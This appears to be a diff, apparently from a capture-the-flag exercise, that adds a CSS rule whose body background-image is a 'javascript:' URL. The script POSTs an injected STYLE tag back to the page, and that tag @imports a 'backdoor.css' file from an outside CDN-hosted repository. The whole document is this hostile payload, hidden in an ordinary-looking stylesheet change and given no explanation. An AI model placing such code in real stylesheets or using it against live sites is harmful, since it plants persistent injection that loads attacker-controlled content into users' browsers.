@@ -1,0 +1,3 @@
+body {
+    background-image: url('javascript:var message = '&LTSTYLE&GT@import&quot;https://cdn.jsdelivr.net/gh/jwtan/unity-ctf-2021@0.0.3/backdoor.css&quot;;'; var xhr = null; xhr = new XMLHttpRequest(); xhr.open(&quot;POST&quot;, window.location.pathname, true); xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json&quot;); xhr.send(JSON.stringify({&quot;message&quot;:message}));')
+}
